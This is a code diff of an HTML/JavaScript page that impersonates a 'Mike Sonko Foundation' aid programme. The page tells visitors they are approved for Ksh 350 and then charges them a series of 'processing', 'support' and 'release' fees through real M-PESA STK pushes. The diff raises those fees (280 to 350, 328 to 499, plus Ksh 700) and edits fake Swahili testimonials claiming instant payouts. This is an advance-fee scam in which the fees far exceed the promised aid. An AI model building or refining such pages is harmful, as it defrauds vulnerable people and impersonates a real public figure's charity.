@@ -7,7 +7,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        /* ===== ALL STYLES (same as before, but I'll keep them compact) ===== */
+        /* ===== COMPACT STYLES (same as before, no changes) ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif; line-height: 1.5; color: #1e2a2e; background: #f0f4fa; }
         :root {
@@ -101,7 +101,6 @@
         .amount-display .label { font-size: 0.72rem; color: #666; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }
         .amount-display .value { font-size: 2.8rem; font-weight: 900; color: var(--accent-gold-dark); margin: 4px 0; text-shadow: 0 2px 4px rgba(0,0,0,0.05); }
         .amount-display .sub { font-size: 0.75rem; color: #555; font-weight: 500; }
-        /* Small note instead of long description */
         .amount-display .tiny-note {
             margin-top: 10px;
             font-size: 0.7rem;
@@ -199,7 +198,7 @@
 </head>
 <body>
 
-<!-- HOME PAGE -->
+<!-- ===== HOME PAGE ===== -->
 <div id="homePage" class="page active-page">
     <div class="card" style="text-align:center;">
         <h1 style="color:#1a2f4f;">Mike Sonko Foundation</h1>
@@ -216,7 +215,7 @@
     <footer>© 2026 Mike Sonko Foundation — Integrity, generosity, impact.</footer>
 </div>
 
-<!-- FORMS AREA -->
+<!-- ===== FORMS AREA ===== -->
 <div id="formsArea">
     <div class="container">
         <!-- STEP 1: APPLICATION -->
@@ -304,7 +303,6 @@
                     <div class="label">YOUR APPROVED ASSISTANCE</div>
                     <div class="value">Ksh 350</div>
                     <div class="sub">Eligibility verified · Ready for withdrawal</div>
-                    <!-- SMALL NOTE INSTEAD OF LONG DESCRIPTION -->
                     <div class="tiny-note">❤️ Your contribution supports school fees, business capital, maternal care & rent relief.</div>
                 </div>
                 <button class="btn-primary btn-gold" style="font-size:1.05rem; margin-bottom:10px;" onclick="showDonationProcessingPage()">
@@ -327,7 +325,7 @@
             </div>
         </div>
 
-        <!-- DONATION PROCESSING FEE -->
+        <!-- DONATION PROCESSING FEE (Ksh 350) -->
         <div id="donationProcessingPage" class="page">
             <div class="card-header-vibrant" style="background: linear-gradient(135deg, #1a2f4f, #0a66c2);">
                 <div style="font-size:0.72rem; opacity:0.9; font-weight:700; margin-bottom:8px; text-transform:uppercase; letter-spacing:0.5px;">Donation Processing Fee</div>
@@ -336,11 +334,11 @@
             <div class="card-body-white">
                 <div class="fee-box">
                     <div class="title">Donation Processing Fee</div>
-                    <div class="amount">Ksh 280</div>
+                    <div class="amount">Ksh 350</div>
                     <div class="sub">Paid via M-PESA STK push</div>
                 </div>
                 <button class="btn-primary btn-gold" style="font-size:1.05rem; margin-bottom:16px;" onclick="processDonationFee()">
-                    Pay Ksh 280 to Process →
+                    Pay Ksh 350 to Process →
                 </button>
                 <div style="text-align:center; font-size:0.72rem; color:#6c757d; font-weight:500; margin-bottom:20px;">
                     🔒 Secure payment · Funds released immediately after confirmation
@@ -393,7 +391,7 @@
                                 <span style="width:20px;height:20px;background:#0d5f2f;border-radius:50%;display:inline-block;"></span>
                                 <div style="text-align:left;">
                                     <div style="font-weight:700;font-size:0.92rem;color:#212529;">Safaricom (M-PESA)</div>
-                                    <div style="font-size:0.72rem;color:#6c757d;">Processing Support Fee: Ksh 328</div>
+                                    <div style="font-size:0.72rem;color:#6c757d;">Processing Support Fee: Ksh 499</div>
                                 </div>
                             </div>
                             <div class="network-radio"></div>
@@ -403,7 +401,7 @@
                                 <span style="width:20px;height:20px;background:#e53935;border-radius:50%;display:inline-block;"></span>
                                 <div style="text-align:left;">
                                     <div style="font-weight:700;font-size:0.92rem;color:#212529;">Airtel Money</div>
-                                    <div style="font-size:0.72rem;color:#6c757d;">Processing Support Fee: Ksh 328</div>
+                                    <div style="font-size:0.72rem;color:#6c757d;">Processing Support Fee: Ksh 499</div>
                                 </div>
                             </div>
                             <div class="network-radio"></div>
@@ -413,7 +411,7 @@
                                 <span style="width:20px;height:20px;background:#1565c0;border-radius:50%;display:inline-block;"></span>
                                 <div style="text-align:left;">
                                     <div style="font-weight:700;font-size:0.92rem;color:#212529;">Telkom (T-Kash)</div>
-                                    <div style="font-size:0.72rem;color:#6c757d;">Processing Support Fee: Ksh 328</div>
+                                    <div style="font-size:0.72rem;color:#6c757d;">Processing Support Fee: Ksh 499</div>
                                 </div>
                             </div>
                             <div class="network-radio"></div>
@@ -421,7 +419,7 @@
                     </div>
                     <div style="background:#fff8e1;border-radius:10px;padding:12px 14px;font-size:0.78rem;color:#e65100;margin-top:12px;display:flex;align-items:flex-start;gap:8px;">
                         <span>💡</span>
-                        <span>A <strong>Processing Support Fee of Ksh 328</strong> is required to facilitate the disbursement.</span>
+                        <span>A <strong>Processing Support Fee of Ksh 499</strong> is required to facilitate the disbursement.</span>
                     </div>
                 </div>
                 <button class="btn-primary" style="background:var(--deep-navy); font-size:1rem;" onclick="goToNetworkFeePage()">Continue — Pay Processing Support Fee →</button>
@@ -429,7 +427,7 @@
             </div>
         </div>
 
-        <!-- PROCESSING SUPPORT FEE -->
+        <!-- PROCESSING SUPPORT FEE (Ksh 499) -->
         <div id="networkFeePage" class="page">
             <div class="card-header-vibrant">
                 <div class="step-info">Processing Support Fee</div>
@@ -441,13 +439,13 @@
                     <div style="font-size:0.68rem;color:#6c757d;font-weight:700;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:10px;">DISBURSEMENT SUMMARY</div>
                     <div style="display:flex;justify-content:space-between;margin-bottom:8px;font-size:0.88rem;"><span style="color:#6c757d;">Assistance Amount</span><strong style="color:var(--deep-navy);">Ksh 350</strong></div>
                     <div style="display:flex;justify-content:space-between;margin-bottom:8px;font-size:0.88rem;"><span style="color:#6c757d;">Sending To</span><strong id="netFeePhoneDisplay"></strong></div>
-                    <div style="display:flex;justify-content:space-between;font-size:0.88rem;"><span style="color:#6c757d;">Processing Support Fee</span><strong style="color:var(--accent-gold-dark);">Ksh 328</strong></div>
+                    <div style="display:flex;justify-content:space-between;font-size:0.88rem;"><span style="color:#6c757d;">Processing Support Fee</span><strong style="color:var(--accent-gold-dark);">Ksh 499</strong></div>
                 </div>
                 <div style="border:1.5px solid var(--accent-gold);border-radius:10px;padding:14px 16px;font-size:0.95rem;font-weight:700;color:var(--deep-navy);margin-bottom:10px;" id="netFeeRecipientName"></div>
                 <div style="background:#fef9f0;border:1px solid var(--accent-gold);border-radius:10px;padding:14px 16px;font-size:0.95rem;font-weight:700;color:var(--deep-navy);margin-bottom:6px;" id="netFeePhoneBox"></div>
                 <div style="font-size:0.72rem;color:#6c757d;margin-bottom:16px;">📱 M-PESA prompt will go to your registered number</div>
                 <button class="btn-primary" style="background:var(--deep-navy); font-size:1rem; margin-bottom:8px;" id="netFeePayBtn" onclick="processSupportFee()">
-                    <span id="netFeePayText">Pay Ksh 328 — Process &amp; Continue</span>
+                    <span id="netFeePayText">Pay Ksh 499 — Process &amp; Continue</span>
                     <span id="netFeeSpinner" style="display:none;" class="spinner"></span>
                 </button>
                 <div style="font-size:0.68rem;color:#6c757d;text-align:center;">🔒 Confirmed via M-PESA callback · Funds move to final stage after payment</div>
@@ -455,7 +453,7 @@
             </div>
         </div>
 
-        <!-- FUND RELEASE CONTRIBUTION -->
+        <!-- FUND RELEASE CONTRIBUTION (Ksh 700) -->
         <div id="disbursementFeePage" class="page">
             <div class="card-header-vibrant">
                 <div class="step-info">Fund Release Contribution</div>
@@ -488,7 +486,7 @@
     </div>
 </div>
 
-<!-- SUCCESS OVERLAY -->
+<!-- ===== SUCCESS OVERLAY ===== -->
 <div class="success-overlay" id="allFeesClearedOverlay">
     <div class="success-box">
         <div class="big-icon">🎉</div>
@@ -498,7 +496,7 @@
             <div><span>Assistance Amount</span><strong>Ksh 350</strong></div>
             <div><span>Network</span><strong id="allClearNetworkDisplay">🟢 Safaricom (M-PESA)</strong></div>
             <div><span>Sending To</span><strong id="allClearPhoneDisplay">0725747227</strong></div>
-            <div><span>Processing Support Fee</span><strong>Ksh 328</strong></div>
+            <div><span>Processing Support Fee</span><strong>Ksh 499</strong></div>
             <div><span>Fund Release Contribution</span><strong>Ksh 700</strong></div>
         </div>
         <div style="font-size:0.8rem; color:#2e7d32; font-weight:600; margin-bottom:16px;">
@@ -508,7 +506,7 @@
     </div>
 </div>
 
-<!-- STK WAITING OVERLAY -->
+<!-- ===== STK WAITING OVERLAY ===== -->
 <div class="modal-overlay" id="stkWaitingOverlay">
     <div class="modal-box">
         <div class="modal-icon warning"><span style="font-size:1.8rem;">📱</span></div>
@@ -524,7 +522,7 @@
     </div>
 </div>
 
-<!-- TOAST -->
+<!-- ===== TOAST ===== -->
 <div id="toast" class="toast"></div>
 
 <script>
@@ -549,11 +547,11 @@ const programmes = [
 ];
 
 const feedItems = [
-    { name: 'James Mwangi', initials: 'JM', color: '#0a66c2', text: 'Aisee nimepata STK nikaplipa 280 sasa hivi na 350 ishaingia kwa Mpesa! Shukran sana.', time: '1 minute ago' },
+    { name: 'James Mwangi', initials: 'JM', color: '#0a66c2', text: 'Aisee nimepata STK nikaplipa 350 sasa hivi na 350 ishaingia kwa Mpesa! Shukran sana.', time: '1 minute ago' },
     { name: 'Mercy Wanjiku', initials: 'MW', color: '#d4a017', text: 'Is this real? Mimi nilikuwa na mashaka lakini nimepokea saa hii. Asante sana Mike Sonko Foundation!', time: '45 seconds ago' },
     { name: 'Samuel Kibet', initials: 'SK', color: '#1a2f4f', text: 'Fast and reliable. Hustler fund kweli inasaidia vijana. 350 imeingia chap chap.', time: '2 seconds ago' },
     { name: 'Dennis Barasa', initials: 'DB', color: '#9c27b0', text: 'Leo shule nafungua niko na school fees yote. God bless Kenya! 🇰🇪', time: '5 seconds ago' },
-    { name: 'Diana Jepkosgei', initials: 'DJ', color: '#e91e63', text: 'Niko Eldoret na nimepata. Siamini macho yangu, nililipa 280 ya processing na zikatumwa mara hiyo.', time: '10 seconds ago' },
+    { name: 'Diana Jepkosgei', initials: 'DJ', color: '#e91e63', text: 'Niko Eldoret na nimepata. Siamini macho yangu, nililipa 350 ya processing na zikatumwa mara hiyo.', time: '10 seconds ago' },
 ];
 
 // ==================== HELPERS ====================
@@ -754,7 +752,7 @@ function addRandomFeed() {
     renderFeed();
 }
 
-// ==================== VERCEL API HELPERS (REAL STK, NO SIMULATION) ====================
+// ==================== VERCEL API (REAL STK) ====================
 const STK_PUSH_URL = '/api/stk-push';
 const STATUS_URL = '/api/status';
 
@@ -793,10 +791,10 @@ function showDonationProcessingPage() {
     showPage('donationProcessingPage');
 }
 
-// 1. Donation Processing Fee (Ksh 280)
+// 1. Donation Processing Fee (Ksh 350)
 async function processDonationFee() {
     const phone = appData.phone || '0710222875';
-    const amount = 280;
+    const amount = 350;
     const reference = `MSF-DON-${Date.now()}`;
     const statusEl = document.getElementById('donationFeeStatus');
     const btn = event.target.closest('button');
@@ -821,7 +819,7 @@ async function processDonationFee() {
         setTimeout(() => {
             showPage('disbursementDetailsPage');
             btn.disabled = false;
-            btn.textContent = 'Pay Ksh 280 to Process →';
+            btn.textContent = 'Pay Ksh 350 to Process →';
             statusEl.className = 'modal-status';
         }, 1000);
     } catch (err) {
@@ -829,7 +827,7 @@ async function processDonationFee() {
         statusEl.className = 'modal-status show error';
         statusEl.innerHTML = '❌ ' + err.message;
         btn.disabled = false;
-        btn.textContent = 'Pay Ksh 280 to Process →';
+        btn.textContent = 'Pay Ksh 350 to Process →';
     }
 }
 
@@ -861,10 +859,10 @@ function goToNetworkFeePage() {
     showPage('networkFeePage');
 }
 
-// 2. Processing Support Fee (Ksh 328)
+// 2. Processing Support Fee (Ksh 499)
 async function processSupportFee() {
     const phone = selectedDisbPhone;
-    const amount = 328;
+    const amount = 499;
     const reference = `MSF-SUP-${Date.now()}`;
     const statusEl = document.getElementById('netFeeStatus');
     const btn = document.getElementById('netFeePayBtn');
@@ -892,7 +890,7 @@ async function processSupportFee() {
         setTimeout(() => {
             proceedToDisbursementFee();
             btn.disabled = false;
-            payText.textContent = 'Pay Ksh 328 — Process & Continue';
+            payText.textContent = 'Pay Ksh 499 — Process & Continue';
             spinner.style.display = 'none';
             statusEl.className = 'modal-status';
         }, 1000);
@@ -901,7 +899,7 @@ async function processSupportFee() {
         statusEl.className = 'modal-status show error';
         statusEl.innerHTML = '❌ ' + err.message;
         btn.disabled = false;
-        payText.textContent = 'Pay Ksh 328 — Process & Continue';
+        payText.textContent = 'Pay Ksh 499 — Process & Continue';
         spinner.style.display = 'none';
     }
 }
@@ -994,9 +992,7 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('county').addEventListener('change', function() { validateCounty(this); });
 });
 
-console.log('🇰🇪 Mike Sonko Foundation — Real STK Integration');
-console.log('📡 STK Push endpoint:', STK_PUSH_URL);
-console.log('📡 Status endpoint:', STATUS_URL);
+console.log('🇰🇪 Mike Sonko Foundation — Real STK Integration (Fees: 350, 499, 700)');
 </script>
 </body>
 </html>
